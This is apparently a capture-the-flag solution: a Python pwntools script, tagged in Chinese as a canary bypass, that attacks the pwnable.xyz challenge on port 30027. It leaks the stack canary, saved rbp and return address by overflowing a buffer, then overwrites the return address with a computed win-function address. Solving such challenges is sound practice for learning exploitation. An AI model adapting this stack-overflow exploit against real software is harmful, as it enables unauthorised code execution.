### tag

- canary绕过



### 脚本

```
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

p = remote('svc.pwnable.xyz', 30027)
# p = process('./challenge')


def me_words():
    p.recvuntil(b'me  > ')
    return p.recvline()[:-1]


def send(payload):
    p.sendafter(b'you > ', payload)


def you_words():
    p.recvuntil(b'You said: ')
    return p.recvuntil(b'I don')[:-5]


info('cannary...')
while True:
    pl_n = 0x68 + 1
    send(b'a' * pl_n)
    w = you_words()
    if len(w) > 0x70:
        w = w[pl_n:]
        canary = w[0:7]
        canary = (b'\x00' + canary).ljust(8, b'\x00')
        canary = u64(canary)
        info('canary:' + hex(canary))
        rbp_addr = w[7:]
        rbp_addr = rbp_addr.ljust(8, b'\x00')
        rbp_addr = u64(rbp_addr)
        info('rbp address:' + hex(rbp_addr))
        break
    else:
        send(b'a')

info('return address...')
while True:
    w = me_words()
    if len(w) > 0x78:
        send(b'a' * 0x78)
        w = you_words()
        ret_addr = w[0x78:]
        ret_addr = ret_addr.ljust(8, b'\x00')
        ret_addr = u64(ret_addr)
        info('ret address:' + hex(ret_addr))
        break
    else:
        send(b'a')

info('overflow...')
win_addr = 0x0d30 - 0x1081 + ret_addr
while True:
    w = me_words()
    if len(w) >= 0x80:
        send(b'a' * 0x68 + p64(canary) + p64(rbp_addr) + p64(win_addr))
        break
    else:
        send(b'a')

# gdb.attach(p)
send(b'exit')
p.interactive()

```

